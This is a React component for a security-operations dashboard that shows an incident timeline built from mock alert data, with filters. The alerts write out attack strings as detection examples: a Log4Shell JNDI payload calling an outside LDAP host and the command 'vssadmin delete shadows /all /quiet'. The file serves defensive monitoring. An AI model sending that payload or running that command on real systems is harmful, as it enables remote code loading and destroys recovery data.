import React, { useState, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Clock, Filter, Search, X, ChevronDown } from 'lucide-react';
import TimelineEvent    from './TimelineEvent';
import TimelineDetailModal from './TimelineDetailModal';

// ── Default timeline events built from mock alert data ────
const DEFAULT_EVENTS = [
  {
    id: 'TL-001', type: 'recon', severity: 'medium',
    timestamp: new Date(Date.now() - 95 * 60000).toISOString(),
    title: 'Network Port Scan Detected',
    description: 'Nmap SYN scan against 192.168.56.0/24. 1,243 packets in 15 seconds.',
    agent: 'suricata-nsm', src_ip: '192.168.56.20',
    mitre: ['T1046'], rule_id: '100014',
    raw: { sid: '9000001', proto: 'TCP', flags: 'S', pkts: 1243 },
  },
  {
    id: 'TL-002', type: 'auth', severity: 'high',
    timestamp: new Date(Date.now() - 88 * 60000).toISOString(),
    title: 'SSH Brute Force — 47 failed attempts',
    description: 'Hydra SSH brute force from 203.0.113.45 against ubuntu-webserver. 47 failures in 60s.',
    agent: 'ubuntu-webserver', src_ip: '203.0.113.45',
    mitre: ['T1110.001'], rule_id: '100001',
    raw: { attempts: 47, window_s: 60, dest_port: 22, tool: 'Hydra' },
  },
  {
    id: 'TL-003', type: 'alert', severity: 'high',
    timestamp: new Date(Date.now() - 75 * 60000).toISOString(),
    title: 'RDP Brute Force from 203.0.113.78',
    description: 'Crowbar RDP brute force against win10-victim. 12 failed logins.',
    agent: 'win10-victim', src_ip: '203.0.113.78',
    mitre: ['T1110.001'], rule_id: '100003',
    raw: { attempts: 12, dest_port: 3389 },
  },
  {
    id: 'TL-004', type: 'execution', severity: 'high',
    timestamp: new Date(Date.now() - 62 * 60000).toISOString(),
    title: 'PowerShell Encoded Command Executed',
    description: 'powershell.exe launched with -EncodedCommand flag. Base64 payload decoded to IEX download cradle.',
    agent: 'win10-victim', src_ip: null,
    mitre: ['T1059.001', 'T1027'], rule_id: '100005',
    raw: { commandLine: 'powershell.exe -EncodedCommand SQBFAF...', pid: 4812 },
  },
  {
    id: 'TL-005', type: 'alert', severity: 'critical',
    timestamp: new Date(Date.now() - 48 * 60000).toISOString(),
    title: 'LSASS Memory Access — Mimikatz Pattern',
    description: 'Process memory access to lsass.exe with GrantedAccess=0x1FFFFF. Matches Mimikatz pattern.',
    agent: 'win10-victim', src_ip: null,
    mitre: ['T1003.001'], rule_id: '100013',
    raw: { targetImage: 'lsass.exe', grantedAccess: '0x1FFFFF', sourceProcess: 'powershell.exe' },
  },
  {
    id: 'TL-006', type: 'user', severity: 'critical',
    timestamp: new Date(Date.now() - 40 * 60000).toISOString(),
    title: 'Backdoor Admin Account Created',
    description: 'net.exe created user "backdooruser" and added to Administrators group. EventIDs 4720 + 4732.',
    agent: 'win10-victim', src_ip: null,
    mitre: ['T1136.001', 'T1098'], rule_id: '100009',
    raw: { newUser: 'backdooruser', eventId: 4720, groupAdded: 'Administrators' },
  },
  {
    id: 'TL-007', type: 'file', severity: 'critical',
    timestamp: new Date(Date.now() - 28 * 60000).toISOString(),
    title: 'Shadow Copy Deletion — Ransomware Pre-Stage',
    description: 'vssadmin.exe delete shadows /all /quiet executed. All VSS shadow copies removed.',
    agent: 'win10-victim', src_ip: null,
    mitre: ['T1490'], rule_id: '100012',
    raw: { commandLine: 'vssadmin.exe delete shadows /all /quiet', pid: 7832 },
  },
  {
    id: 'TL-008', type: 'automation', severity: 'info',
    timestamp: new Date(Date.now() - 20 * 60000).toISOString(),
    title: 'TheHive Case Auto-Created',
    description: 'auto_investigate.py created Case CASE-2024-0047 with P1 severity. AbuseIPDB score: 94%.',
    agent: 'soc-automation', src_ip: null,
    mitre: [], rule_id: null,
    raw: { caseId: 'CASE-2024-0047', severity: 4, abuseScore: 94 },
  },
  {
    id: 'TL-009', type: 'automation', severity: 'info',
    timestamp: new Date(Date.now() - 15 * 60000).toISOString(),
    title: 'IP 203.0.113.45 Blocked via iptables + pfSense',
    description: 'block_ip.py executed. iptables DROP rule added, pfSense WAN block rule applied.',
    agent: 'soc-automation', src_ip: null,
    mitre: [], rule_id: null,
    raw: { ip: '203.0.113.45', methods: ['iptables', 'pfsense'], result: 'success' },
  },
  {
    id: 'TL-010', type: 'network', severity: 'high',
    timestamp: new Date(Date.now() - 5 * 60000).toISOString(),
    title: 'Log4Shell JNDI Payload in HTTP Header',
    description: 'User-Agent header contained ${jndi:ldap://198.51.100.99:1389/a}. Web server targeted.',
    agent: 'ubuntu-webserver', src_ip: '198.51.100.99',
    mitre: ['T1190'], rule_id: '100019',
    raw: { header: 'User-Agent', payload: '${jndi:ldap://198.51.100.99:1389/a}', status: 200 },
  },
];

const SEV_ORDER = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };

export default function IncidentTimeline({ events = DEFAULT_EVENTS, caseId }) {
  const [selected,   setSelected]   = useState(null);
  const [modalEvent, setModalEvent] = useState(null);
  const [search,     setSearch]     = useState('');
  const [sevFilter,  setSevFilter]  = useState('all');
  const [typeFilter, setTypeFilter] = useState('all');

  const severities = ['all', 'critical', 'high', 'medium', 'low', 'info'];
  const types      = ['all', ...new Set(events.map(e => e.type))];

  const filtered = useMemo(() => {
    const q = search.toLowerCase().trim();
    return events
      .filter(e => {
        if (sevFilter  !== 'all' && e.severity !== sevFilter)  return false;
        if (typeFilter !== 'all' && e.type     !== typeFilter)  return false;
        if (q && !e.title.toLowerCase().includes(q) &&
                 !e.description.toLowerCase().includes(q))      return false;
        return true;
      })
      .sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
  }, [events, sevFilter, typeFilter, search]);

  const handleClick = (event) => {
    setSelected(event.id === selected ? null : event.id);
    setModalEvent(event);
  };

  const SEV_COLOR = {
    critical: '#ff2d6d', high: '#ff8c00',
    medium: '#ffd600',   low: '#00ff88',
    info: '#00e5ff',     all: '#00e5ff',
  };

  return (
    <div>
      {/* ── Header ─────────────────────────────────── */}
      <div style={{
        display: 'flex', justifyContent: 'space-between',
        alignItems: 'flex-start', marginBottom: 18, flexWrap: 'wrap', gap: 12,
      }}>
        <div>
          <div style={{
            display: 'flex', alignItems: 'center', gap: 8,
            fontSize: 15, fontWeight: 600, color: '#e8f4ff',
          }}>
            <Clock size={16} color="#00e5ff" />
            Incident Timeline
            {caseId && (
              <span style={{
                fontFamily: 'JetBrains Mono, monospace',
                fontSize: 11, color: '#00e5ff',
                background: 'rgba(0,229,255,0.10)',
                border: '1px solid rgba(0,229,255,0.22)',
                borderRadius: 4, padding: '1px 7px',
              }}>{caseId}</span>
            )}
          </div>
          <div style={{ fontSize: 11.5, color: '#3d5080', marginTop: 3 }}>
            {filtered.length} of {events.length} events · Click any event to expand
          </div>
        </div>

        {/* Filters */}
        <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center' }}>
          {/* Search */}
          <div style={{ position: 'relative' }}>
            <Search size={12} color="#4a6090" style={{
              position: 'absolute', left: 9,
              top: '50%', transform: 'translateY(-50%)',
              pointerEvents: 'none',
            }} />
            <input
              className="soc-input"
              value={search}
              onChange={e => setSearch(e.target.value)}
              placeholder="Filter events…"
              style={{ paddingLeft: 28, height: 30, fontSize: 12, width: 160 }}
            />
          </div>

          {/* Severity pills */}
          {severities.map(s => (
            <button key={s} onClick={() => setSevFilter(s)} style={{
              padding: '3px 10px', borderRadius: 9999,
              fontSize: 11, fontWeight: 500, cursor: 'pointer',
              border: '1px solid',
              background:  sevFilter === s ? `${SEV_COLOR[s]}18` : 'rgba(255,255,255,0.04)',
              color:       sevFilter === s ? SEV_COLOR[s]       : '#6b7fa3',
              borderColor: sevFilter === s ? `${SEV_COLOR[s]}40`: '#1a2744',
            }}>
              {s}
            </button>
          ))}
        </div>
      </div>

      {/* ── Timeline ────────────────────────────────── */}
      {filtered.length === 0 ? (
        <div style={{ textAlign: 'center', padding: '40px 0', color: '#3d5080' }}>
          <Clock size={32} style={{ opacity: 0.2, margin: '0 auto 10px' }} />
          <div style={{ fontSize: 13 }}>No events match current filter</div>
        </div>
      ) : (
        <div style={{ paddingLeft: 8 }}>
          {filtered.map((event, i) => (
            <TimelineEvent
              key={event.id}
              event={event}
              index={i}
              isLast={i === filtered.length - 1}
              isSelected={selected === event.id}
              onClick={handleClick}
            />
          ))}
        </div>
      )}

      {/* ── Detail modal ────────────────────────────── */}
      {modalEvent && (
        <TimelineDetailModal
          event={modalEvent}
          onClose={() => { setModalEvent(null); setSelected(null); }}
        />
      )}
    </div>
  );
}